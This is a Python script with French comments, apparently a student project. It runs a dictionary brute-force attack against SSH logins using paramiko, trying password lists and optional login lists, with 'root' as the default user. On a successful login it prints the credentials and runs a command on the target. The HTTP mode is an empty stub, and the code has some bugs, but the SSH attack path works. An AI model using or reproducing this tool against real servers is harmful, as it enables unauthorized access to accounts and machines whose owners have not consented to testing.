#C:/ProgramData/Anaconda3/python.exe


#------------------------------------------------------------------------------------------
#Pb que j'ai: 
# J'en ai pas :) enfin plus
#Sinon le butfroce fonction
#------------------------------------------------------------------------------------------


import readline
import sys
import paramiko


ssh = paramiko.SSHClient
count_ligne_pass= 0
count_ligne_login= 0

Nb_Arg = len((sys.argv))
if Nb_Arg > 0 :
    Nb_Arg = Nb_Arg - 1 # pour avoir alors le meme nombre d'argument que leurs nom

if Nb_Arg == 0 :
    print ("Le scrpit prend les agruments suivant : protocole (http, ssh), url (ip ou url de connection), dictionnaire de password, dictionnaire login (facultatif) ")
    quit ("Fin du programme")
elif Nb_Arg <= 2 : 
        print ("Le scrpit prend les agruments suivant : protocole (http, ssh), url (ip ou url de connection), dictionnaire de password, dictionnaire login (facultatif) ")


#fonction qui prends verifie les arguement

if sys.argv[1] == "http":
    proto="http"
    def requet_http(password, login): #fonction faire des requet http avec la ligne du dico
        # print("test connection http avec pass =",password, "login =", login)
        print


elif sys.argv[1] == "ssh": #fonction faire des requet ssh avec la ligne du dico
    proto="ssh"
    def requet_ssh(password, login):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_client.connect(hostname=url, username=login, password=password, timeout=1)

        except:
            print("Test de connection qui a echoué avec",login,":", password)

        else:
            print ("Connection reussi sur la machine", url, "avec les credentials", login, ":", password)
            # print("test connection http avec pass =",password, "login =",login)
            ssh_client.exec_command('touch ssh')# pour validé que la commande marche
            quit()

else : 
    print("Il n'y a pas de protocole valable, séléctionner http ou ssh")
    sys.exit



#ftest si il y a une URL
if Nb_Arg >= 2:
    url = sys.argv[2]
else : 
    print("Il y a pas d'URL pour l'attques")
    sys.exit  

#-------------------------------------------------------------------------------------
#fonction lecture du dictionnaire password

# if Nb_Arg >= 3 : # Ne creer la fonction que si l'argument existe ce qui evite des erreurs

#     def linge_dico_pass(count):
#         dico = open(sys.argv[3],"r") # on ouvre le dico
#         NbLines = (len (dico.readlines())) #on defini le nb de ligne
        
#         with open(sys.argv[3]) as f:
#             data_password = f.readlines()[count] # on ligne la ligne numero count
#             return (data_password)


#fonction lecture du dictionnaire login

# if Nb_Arg >= 4 : # Ne creer la fonction que si l'argument existe ce qui evite des erreurs
#     print()
#     def ligne_dico_login (count):
#         dico = open(sys.argv[4],"r")
#         NbLines = (len (dico.readlines()))

#         with open(sys.argv[4]) as f:
#             data_login = f.readlines()[count]
#             return (data_login)


#faire une boucle qui lit le dico ligne par ligne et qui fait appel aux fonction http 

#-----------------------------------------------------------------------------------------------------


passdico = open(sys.argv[3]).read().splitlines()

if Nb_Arg == 3 :

    for password in passdico :

        if sys.argv[1] == "http":
             requet_http(password,"admin")
        
        elif sys.argv[1] == "ssh":
            requet_ssh(password,"root") # appel de fonction request ssh


elif Nb_Arg <= 2: 
    print ("Il n'y a pas de dictionnaire de password,  il faut en mettre un !!")


# Si il y a un dictionnaire de login

logdico = open(sys.argv[4]).read().splitlines()


if Nb_Arg >= 4 :

    for login in logdico :
        for password in passdico : 

            if sys.argv[1] == "http":
                requet_http(password,login)
            
            elif sys.argv[1] == "ssh":
                requet_ssh(password,login)
